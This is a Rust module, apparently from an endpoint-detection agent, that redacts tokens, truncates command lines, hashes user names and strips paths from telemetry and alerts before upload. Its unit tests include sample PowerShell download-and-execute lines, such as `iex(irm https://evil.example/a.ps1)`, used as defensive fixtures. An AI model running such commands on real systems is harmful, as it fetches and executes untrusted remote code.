//! Data-minimisation filters applied to telemetry *before upload*. Detection
//! always runs on the unfiltered event; only the copy sent to the server is
//! reduced.
//!
//! * Secrets are **always** redacted from command lines, script content,
//!   registry data and alert summaries, whatever the policy says: Kestrel
//!   enrollment / uninstall tokens (`kst_…`, `kse_…`, `kte_…`, `kun_…`),
//!   `*TOKEN=…` assignments (`TOKEN=`, `UNINSTALL_TOKEN=`, …) and
//!   `--token` / `--uninstall-token` / `-Token` arguments (M6).
//! * Alerts honour the same policy as events (M9): user names hashed,
//!   command lines truncated when `capture_cmdline` is off (process, ancestry,
//!   evidence and quoted parts of the summary), redacted path prefixes
//!   removed everywhere including the summary. Health and review requests
//!   hash the user name too ([`PrivacyFilter::user`]).

use kestrel_common::{Event, EventData, Privacy, Telemetry};
use sha2::{Digest, Sha256};

pub const REDACTED: &str = "[redacted]";

/// Applies [`Privacy`] + [`Telemetry`] policy to events.
#[derive(Debug, Clone)]
pub struct PrivacyFilter {
    privacy: Privacy,
    telemetry: Telemetry,
    salt: String,
    /// Lower-cased, `\`-normalised prefixes.
    prefixes: Vec<String>,
}

impl PrivacyFilter {
    pub fn new(privacy: &Privacy, telemetry: &Telemetry, salt: &str) -> PrivacyFilter {
        PrivacyFilter {
            prefixes: privacy
                .redact_path_prefixes
                .iter()
                .map(|p| norm_path(p))
                .filter(|p| !p.is_empty())
                .collect(),
            privacy: privacy.clone(),
            telemetry: telemetry.clone(),
            salt: salt.to_string(),
        }
    }

    /// Should this event be uploaded at all?
    pub fn wants_upload(&self, e: &Event) -> bool {
        if !self.telemetry.upload_events {
            return false;
        }
        let kind = e.kind();
        if !self.telemetry.event_kinds.is_empty()
            && !self
                .telemetry
                .event_kinds
                .iter()
                .any(|k| k == kind.as_str())
        {
            return false;
        }
        if !self.privacy.capture_dns && matches!(e.data, EventData::DnsQuery { .. }) {
            return false;
        }
        true
    }

    /// Filter an event for upload; `None` = drop.
    pub fn filter_event(&self, e: &Event) -> Option<Event> {
        if !self.wants_upload(e) {
            return None;
        }
        Some(self.scrub(e.clone()))
    }

    /// Apply field-level scrubbing (also used for alert evidence).
    pub fn scrub(&self, mut e: Event) -> Event {
        match &mut e.data {
            EventData::ProcessStart(ps) => {
                ps.cmdline = redact_secrets(&ps.cmdline);
                if !self.privacy.capture_cmdline {
                    ps.cmdline = truncate_cmdline(&ps.cmdline);
                }
                if let Some(u) = ps.user.as_mut() {
                    *u = self.user(u);
                }
                self.redact(&mut ps.image);
                if self.is_redacted(&ps.cmdline) {
                    ps.cmdline = REDACTED.into();
                }
            }
            EventData::ImageLoad { path, .. } => self.redact(path),
            EventData::FileAccess { path, .. } => self.redact(path),
            EventData::ScriptBlock { content, .. } => {
                if !self.privacy.capture_script_content {
                    *content = REDACTED.into();
                } else {
                    *content = redact_secrets(content);
                }
            }
            EventData::RegistrySet { data, .. } => {
                if let Some(d) = data.as_mut() {
                    *d = redact_secrets(d);
                }
            }
            EventData::ProcessAccess(t)
            | EventData::RemoteThread(t)
            | EventData::ThreadContext(t)
            | EventData::DebugAttach(t) => self.redact(&mut t.target_image),
            EventData::FileActivity(f) => {
                for p in f.sample_paths.iter_mut().chain(f.canary_hits.iter_mut()) {
                    self.redact(p);
                }
                // A redacted sample says nothing; drop it rather than upload "[redacted]" x5.
                f.sample_paths.retain(|p| p != REDACTED);
            }
            EventData::TaskRegistered(t) => {
                for a in t.actions.iter_mut() {
                    *a = redact_secrets(a);
                    if !self.privacy.capture_cmdline {
                        *a = truncate_cmdline(a);
                    }
                }
                if let Some(u) = t.user.as_mut() {
                    *u = self.user(u);
                }
            }
            EventData::ServiceInstalled(s) => {
                s.image_path = redact_secrets(&s.image_path);
                if !self.privacy.capture_cmdline {
                    s.image_path = truncate_cmdline(&s.image_path);
                }
            }
            EventData::WmiSubscription(w) => {
                w.consumer = redact_secrets(&w.consumer);
                w.filter = redact_secrets(&w.filter);
            }
            EventData::DnsQuery { .. }
            | EventData::NetConnect { .. }
            | EventData::ProcessStop { .. }
            | EventData::DpapiUnprotect { .. }
            | EventData::Tamper { .. } => {}
        }
        e
    }

    /// Scrub an alert before upload: process info, ancestry, evidence and the
    /// summary get the same minimisation as telemetry (M9) plus secret
    /// redaction (M6). DNS evidence is kept even when bulk DNS capture is off.
    pub fn scrub_alert(&self, a: &mut kestrel_common::Alert) {
        let full_cmds: Vec<String> = std::iter::once(&a.process)
            .chain(a.ancestry.iter())
            .map(|p| p.cmdline.clone())
            .filter(|c| !c.trim().is_empty())
            .collect();
        let fix = |p: &mut kestrel_common::ProcessInfo| {
            if let Some(u) = p.user.as_mut() {
                *u = self.user(u);
            }
            self.redact(&mut p.image);
            p.cmdline = redact_secrets(&p.cmdline);
            if !self.privacy.capture_cmdline {
                p.cmdline = truncate_cmdline(&p.cmdline);
            }
            if self.is_redacted(&p.cmdline) {
                p.cmdline = REDACTED.into();
            }
        };
        fix(&mut a.process);
        a.ancestry.iter_mut().for_each(fix);
        a.evidence = a.evidence.drain(..).map(|e| self.scrub(e)).collect();
        a.summary = self.scrub_text(&a.summary, &full_cmds);
    }

    /// Free text that may embed command lines, script content or paths
    /// (alert summaries).
    pub fn scrub_text(&self, text: &str, cmdlines: &[String]) -> String {
        let mut t = redact_secrets(text);
        if !self.privacy.capture_cmdline || !self.privacy.capture_script_content {
            for c in cmdlines {
                let c = redact_secrets(c);
                if c.len() >= 8 && t.contains(c.as_str()) {
                    t = t.replace(c.as_str(), &truncate_cmdline(&c));
                }
            }
            t = redact_quoted(&t);
        }
        for p in &self.prefixes {
            t = redact_prefixed_paths(&t, p);
        }
        t
    }

    pub fn user(&self, u: &str) -> String {
        if !self.privacy.hash_usernames {
            return u.to_string();
        }
        hash_username(&self.salt, u)
    }

    fn is_redacted(&self, s: &str) -> bool {
        if self.prefixes.is_empty() {
            return false;
        }
        let n = norm_path(s.trim_start_matches('"'));
        self.prefixes.iter().any(|p| n.starts_with(p.as_str()))
    }

    fn redact(&self, path: &mut String) {
        if self.is_redacted(path) {
            *path = REDACTED.into();
        }
    }
}

/// Quoted segments (`"…"`) of 12+ characters → `"[redacted]"`. The engine
/// quotes command lines, script excerpts and registry data in summaries.
fn redact_quoted(t: &str) -> String {
    let mut out = String::with_capacity(t.len());
    let mut rest = t;
    while let Some(i) = rest.find('"') {
        let after = &rest[i + 1..];
        match after.find('"') {
            Some(j) => {
                out.push_str(&rest[..=i]);
                if after[..j].chars().count() >= 12 {
                    out.push_str(REDACTED);
                } else {
                    out.push_str(&after[..j]);
                }
                out.push('"');
                rest = &after[j + 1..];
            }
            None => break,
        }
    }
    out.push_str(rest);
    out
}

/// Replace every path in `t` that starts with `prefix` (lower-case,
/// `\`-normalised) by `[redacted]`. The path ends at a quote, parenthesis,
/// comma, semicolon, line break or " — ".
fn redact_prefixed_paths(t: &str, prefix: &str) -> String {
    if prefix.is_empty() {
        return t.to_string();
    }
    let lower = t.replace('/', "\\").to_ascii_lowercase();
    let mut out = String::with_capacity(t.len());
    let mut i = 0;
    while let Some(off) = lower[i..].find(prefix) {
        let start = i + off;
        out.push_str(&t[i..start]);
        let tail = &t[start..];
        let mut end = tail
            .find(['"', '\'', ')', '(', ',', ';', '\n'])
            .unwrap_or(tail.len());
        if let Some(d) = tail[..end].find(" — ") {
            end = d;
        }
        out.push_str(REDACTED);
        i = start + end.max(1).min(tail.len());
    }
    out.push_str(&t[i..]);
    out
}

/// Always-on secret redaction (M6) for command lines and free text.
pub fn redact_secrets(s: &str) -> String {
    let s = redact_token_assignments(s);
    let s = redact_token_flags(&s);
    redact_prefixed_tokens(&s)
}

const SECRET_MARK: &str = "[redacted]";

fn is_ident(b: u8) -> bool {
    b.is_ascii_alphanumeric() || b == b'_'
}

/// End (exclusive) of a value starting at `i`: quoted → up to the closing
/// quote (exclusive), else up to whitespace / quote / shell separator.
fn value_span(s: &str, i: usize) -> (usize, usize) {
    let b = s.as_bytes();
    if i < b.len() && (b[i] == b'"' || b[i] == b'\'') {
        let q = b[i];
        let end = s[i + 1..]
            .find(q as char)
            .map(|j| i + 1 + j)
            .unwrap_or(b.len());
        return (i + 1, end);
    }
    let mut j = i;
    while j < b.len()
        && !b[j].is_ascii_whitespace()
        && !matches!(b[j], b'"' | b'\'' | b';' | b'&' | b'|' | b',')
    {
        j += 1;
    }
    (i, j)
}

/// `NAME=value` where NAME ends in "token" (TOKEN=, UNINSTALL_TOKEN=,
/// KESTREL_ENROLL_TOKEN=, access_token=, …).
fn redact_token_assignments(s: &str) -> String {
    let b = s.as_bytes();
    let mut out = String::with_capacity(s.len());
    let mut last = 0;
    let mut i = 0;
    while i < b.len() {
        if b[i] == b'=' {
            let mut k = i;
            while k > 0 && is_ident(b[k - 1]) {
                k -= 1;
            }
            if s[k..i].to_ascii_lowercase().ends_with("token") {
                let (vs, ve) = value_span(s, i + 1);
                if ve > vs {
                    out.push_str(&s[last..vs]);
                    out.push_str(SECRET_MARK);
                    last = ve;
                    i = ve;
                    continue;
                }
            }
        }
        i += 1;
    }
    out.push_str(&s[last..]);
    out
}

/// `--token v`, `--token=v`, `--uninstall-token v`, `-Token v`, `/token:v`.
fn redact_token_flags(s: &str) -> String {
    const FLAGS: &[&str] = &[
        "--uninstall-token",
        "--token",
        "-uninstalltoken",
        "-token",
        "/token",
    ];
    let lower = s.to_ascii_lowercase();
    let b = s.as_bytes();
    let mut out = String::with_capacity(s.len());
    let mut last = 0;
    let mut i = 0;
    'outer: while i < b.len() {
        let boundary = i == 0 || b[i - 1].is_ascii_whitespace() || matches!(b[i - 1], b'"' | b'\'');
        if boundary {
            for f in FLAGS {
                if lower.as_bytes()[i..].starts_with(f.as_bytes()) {
                    let mut j = i + f.len();
                    // the flag must end here (not `--tokens`, `-tokenize`)
                    if j < b.len()
                        && !(b[j].is_ascii_whitespace()
                            || matches!(b[j], b'=' | b':' | b'"' | b'\''))
                    {
                        continue;
                    }
                    if j < b.len()
                        && matches!(b[j], b'"' | b'\'')
                        && j + 1 < b.len()
                        && b[j + 1].is_ascii_whitespace()
                    {
                        j += 1; // "--token" "value"
                    }
                    while j < b.len() && (b[j].is_ascii_whitespace() || matches!(b[j], b'=' | b':'))
                    {
                        j += 1;
                    }
                    let (vs, ve) = value_span(s, j);
                    if ve > vs {
                        out.push_str(&s[last..vs]);
                        out.push_str(SECRET_MARK);
                        last = ve;
                        i = ve;
                        continue 'outer;
                    }
                }
            }
        }
        i += 1;
    }
    out.push_str(&s[last..]);
    out
}

/// Kestrel token literals: `kst_…` (enrollment / API), `kse_…`, `kte_…`,
/// `kun_…` (uninstall).
fn redact_prefixed_tokens(s: &str) -> String {
    const PREFIXES: &[&str] = &["kst_", "kse_", "kte_", "kun_"];
    let b = s.as_bytes();
    let lower = s.to_ascii_lowercase();
    let mut out = String::with_capacity(s.len());
    let mut last = 0;
    let mut i = 0;
    while i < b.len() {
        let boundary = i == 0 || !b[i - 1].is_ascii_alphanumeric();
        if boundary {
            if let Some(p) = PREFIXES
                .iter()
                .find(|p| lower.as_bytes()[i..].starts_with(p.as_bytes()))
            {
                let vs = i + p.len();
                let mut ve = vs;
                while ve < b.len()
                    && (b[ve].is_ascii_alphanumeric() || matches!(b[ve], b'_' | b'-'))
                {
                    ve += 1;
                }
                if ve - vs >= 6 && s[vs..ve] != *SECRET_MARK {
                    out.push_str(&s[last..vs]);
                    out.push_str(SECRET_MARK);
                    last = ve;
                    i = ve;
                    continue;
                }
            }
        }
        i += 1;
    }
    out.push_str(&s[last..]);
    out
}

/// Salted SHA-256 of the lower-cased user name, prefixed for clarity.
pub fn hash_username(salt: &str, user: &str) -> String {
    let mut h = Sha256::new();
    h.update(salt.as_bytes());
    h.update([0u8]);
    h.update(user.to_lowercase().as_bytes());
    format!("u_{}", &hex::encode(h.finalize())[..16])
}

fn norm_path(p: &str) -> String {
    let p = p.replace('/', "\\").to_ascii_lowercase();
    p.trim_start_matches(r"\\?\").to_string()
}

/// Keep the image and the first flag-like argument only:
/// `"C:\x\powershell.exe" -w h -c iex(...)` → `"C:\x\powershell.exe" -w`.
pub fn truncate_cmdline(cmd: &str) -> String {
    let s = cmd.trim();
    let (image, rest) = if let Some(stripped) = s.strip_prefix('"') {
        match stripped.find('"') {
            Some(end) => (&s[..end + 2], &s[end + 2..]),
            None => (s, ""),
        }
    } else {
        match s.find(char::is_whitespace) {
            Some(i) => (&s[..i], &s[i..]),
            None => (s, ""),
        }
    };
    let flag = rest
        .split_whitespace()
        .find(|t| t.starts_with('-') || t.starts_with('/'));
    match flag {
        // Never keep the value glued to a flag (e.g. `-EncodedCommand:AAAA`, `/c:"..."`).
        Some(f) => {
            let f = f.split([':', '=']).next().unwrap_or(f);
            format!("{image} {f}")
        }
        None => image.to_string(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use kestrel_common::{FileOp, ProcessGuid, ProcessStart};

    fn ps(cmd: &str, image: &str, user: &str) -> Event {
        Event {
            ts: 1,
            pid: 10,
            guid: ProcessGuid::derive("b", 10, 1),
            data: EventData::ProcessStart(ProcessStart {
                ppid: 1,
                image: image.into(),
                cmdline: cmd.into(),
                user: Some(user.into()),
                ..Default::default()
            }),
        }
    }

    #[test]
    fn cmdline_truncation() {
        assert_eq!(
            truncate_cmdline(
                r#""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -w h -c "iex(irm x)""#
            ),
            r#""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -w"#
        );
        assert_eq!(truncate_cmdline(r"cmd.exe /c:secret whoami"), r"cmd.exe /c");
        assert_eq!(
            truncate_cmdline(r"notepad.exe C:\Users\bob\secret.txt"),
            "notepad.exe"
        );
        assert_eq!(truncate_cmdline("x.exe"), "x.exe");
        assert_eq!(truncate_cmdline(r#""C:\a b\x.exe""#), r#""C:\a b\x.exe""#);
    }

    #[test]
    fn full_capture_is_identity() {
        let f = PrivacyFilter::new(&Privacy::default(), &Telemetry::default(), "salt");
        let e = ps("x.exe -a secret", r"C:\x.exe", "CORP\\alice");
        assert_eq!(f.filter_event(&e), Some(e));
    }

    #[test]
    fn minimised() {
        let p = Privacy {
            capture_cmdline: false,
            hash_usernames: true,
            redact_path_prefixes: vec![r"C:/Users/alice/Documents".into()],
            capture_dns: false,
            capture_script_content: false,
        };
        let f = PrivacyFilter::new(&p, &Telemetry::default(), "salt");
        let out = f
            .filter_event(&ps(r"x.exe -a secret", r"C:\x.exe", "CORP\\Alice"))
            .unwrap();
        match out.data {
            EventData::ProcessStart(s) => {
                assert_eq!(s.cmdline, "x.exe -a");
                let u = s.user.unwrap();
                assert!(u.starts_with("u_") && !u.contains("lice"));
                assert_eq!(
                    u,
                    hash_username("salt", "corp\\alice"),
                    "case-insensitive hashing"
                );
            }
            _ => unreachable!(),
        }
        let fa = Event {
            ts: 1,
            pid: 1,
            guid: ProcessGuid::default(),
            data: EventData::FileAccess {
                path: r"c:\users\ALICE\documents\tax.pdf".into(),
                op: FileOp::Read,
            },
        };
        match f.filter_event(&fa).unwrap().data {
            EventData::FileAccess { path, .. } => assert_eq!(path, REDACTED),
            _ => unreachable!(),
        }
        let dns = Event {
            ts: 1,
            pid: 1,
            guid: ProcessGuid::default(),
            data: EventData::DnsQuery {
                qname: "example.com".into(),
                answers: vec![],
            },
        };
        assert!(f.filter_event(&dns).is_none());
        let sb = Event {
            ts: 1,
            pid: 1,
            guid: ProcessGuid::default(),
            data: EventData::ScriptBlock {
                engine: "powershell".into(),
                content: "secret".into(),
            },
        };
        match f.filter_event(&sb).unwrap().data {
            EventData::ScriptBlock { content, .. } => assert_eq!(content, REDACTED),
            _ => unreachable!(),
        }
    }

    #[test]
    fn secrets_always_redacted() {
        let f = PrivacyFilter::new(&Privacy::default(), &Telemetry::default(), "s");
        let cases = [
            (
                r#"msiexec /i KestrelAgent.msi /qn SERVER=edr:8443 TOKEN=kst_enr_AbCdEf123456 CA_B64=QUJD"#,
                r#"msiexec /i KestrelAgent.msi /qn SERVER=edr:8443 TOKEN=[redacted] CA_B64=QUJD"#,
            ),
            (
                r#"msiexec /x k.msi UNINSTALL_TOKEN="kun_very secret" /qn"#,
                r#"msiexec /x k.msi UNINSTALL_TOKEN="[redacted]" /qn"#,
            ),
            (
                r#""C:\Program Files\Kestrel\kestrel-agent.exe" install --server "a:1" --token "kte_123456789" --ca x"#,
                r#""C:\Program Files\Kestrel\kestrel-agent.exe" install --server "a:1" --token "[redacted]" --ca x"#,
            ),
            (
                "kestrel-agent uninstall --token=abcdef --purge",
                "kestrel-agent uninstall --token=[redacted] --purge",
            ),
            (
                "kestrel-agent release-isolation --token hunter2",
                "kestrel-agent release-isolation --token [redacted]",
            ),
            (
                "pwsh -c Invoke-X -Token s3cr3t -Other 1",
                "pwsh -c Invoke-X -Token [redacted] -Other 1",
            ),
            ("echo kse_ABCDEFGHIJ done", "echo kse_[redacted] done"),
            (
                "set KESTREL_ENROLL_TOKEN=xyz&& run",
                "set KESTREL_ENROLL_TOKEN=[redacted]&& run",
            ),
            // no false positives
            ("tar --tokens 5 file", "tar --tokens 5 file"),
            ("tokenizer.exe -tokenize x", "tokenizer.exe -tokenize x"),
            ("desk_1234567", "desk_1234567"),
        ];
        for (input, want) in cases {
            assert_eq!(redact_secrets(input), want, "{input}");
            let out = f.filter_event(&ps(input, r"C:\x.exe", "u")).unwrap();
            match out.data {
                EventData::ProcessStart(p) => assert_eq!(p.cmdline, want),
                _ => unreachable!(),
            }
        }
        // even with command-line capture off (truncation keeps no values)
        let off = PrivacyFilter::new(
            &Privacy {
                capture_cmdline: false,
                ..Privacy::default()
            },
            &Telemetry::default(),
            "s",
        );
        let out = off
            .filter_event(&ps("x.exe --token=kst_ABCDEFGH", r"C:\x.exe", "u"))
            .unwrap();
        match out.data {
            EventData::ProcessStart(p) => assert!(!p.cmdline.contains("ABCDEFGH"), "{}", p.cmdline),
            _ => unreachable!(),
        }
    }

    #[test]
    fn alerts_are_minimised_like_events() {
        use kestrel_common::{Alert, PathClass, ProcessInfo, RuleMode, Severity, SignatureState};
        let pi = |cmd: &str, user: &str| ProcessInfo {
            guid: ProcessGuid::default(),
            pid: 1,
            ppid: 0,
            parent_guid: None,
            image: r"C:\Users\alice\Documents\tools\x.exe".into(),
            cmdline: cmd.into(),
            user: Some(user.into()),
            integrity: None,
            start_ts: 0,
            exit_ts: None,
            signer: None,
            signed: SignatureState::Unsigned,
            sha256: None,
            motw_zone: None,
            file_size: None,
            path_class: PathClass::UserWritable,
        };
        let cmd =
            r#"powershell -w h -c "iex(irm https://evil.example/a.ps1)" TOKEN=kst_ABCDEFGHIJ"#;
        let mut a = Alert {
            id: uuid::Uuid::nil(),
            ts: 1,
            rule_id: "ST-11".into(),
            rule_name: "x".into(),
            rule_author: None,
            severity: Severity::High,
            attack: vec![],
            mode: RuleMode::Protect,
            summary: format!(
                "explorer.exe started powershell.exe with a hidden window: \"{cmd}\" — loaded C:\\Users\\alice\\Documents\\tools\\evil.dll (DLL side-loading)"
            ),
            process: pi(cmd, r"CORP\alice"),
            ancestry: vec![pi(r"explorer.exe /e C:\Users\alice\secret", r"CORP\alice")],
            data_at_risk: vec![],
            evidence: vec![ps(cmd, r"C:\x.exe", r"CORP\alice")],
            actions: vec![],
        };
        let p = Privacy {
            capture_cmdline: false,
            hash_usernames: true,
            redact_path_prefixes: vec![r"C:\Users\alice\Documents".into()],
            capture_dns: true,
            capture_script_content: true,
        };
        PrivacyFilter::new(&p, &Telemetry::default(), "salt").scrub_alert(&mut a);
        assert_eq!(a.process.cmdline, "powershell -w");
        assert_eq!(a.ancestry[0].cmdline, "explorer.exe /e");
        assert!(a.process.user.as_deref().unwrap().starts_with("u_"));
        assert_eq!(a.process.image, REDACTED);
        match &a.evidence[0].data {
            EventData::ProcessStart(s) => assert_eq!(s.cmdline, "powershell -w"),
            _ => unreachable!(),
        }
        assert!(!a.summary.contains("evil.example"), "{}", a.summary);
        assert!(!a.summary.contains("kst_ABC"), "{}", a.summary);
        assert!(
            !a.summary.to_ascii_lowercase().contains(r"alice\documents"),
            "{}",
            a.summary
        );
        assert!(a.summary.contains("DLL side-loading"), "{}", a.summary);
    }

    #[test]
    fn telemetry_kinds() {
        let t = Telemetry {
            upload_events: true,
            event_kinds: vec!["process_start".into()],
            max_outbox_mb: 1,
        };
        let f = PrivacyFilter::new(&Privacy::default(), &t, "s");
        assert!(f.filter_event(&ps("a", "b", "c")).is_some());
        let fa = Event {
            ts: 1,
            pid: 1,
            guid: ProcessGuid::default(),
            data: EventData::FileAccess {
                path: "x".into(),
                op: FileOp::Read,
            },
        };
        assert!(f.filter_event(&fa).is_none());
        let off = PrivacyFilter::new(
            &Privacy::default(),
            &Telemetry {
                upload_events: false,
                ..t
            },
            "s",
        );
        assert!(off.filter_event(&ps("a", "b", "c")).is_none());
    }
}
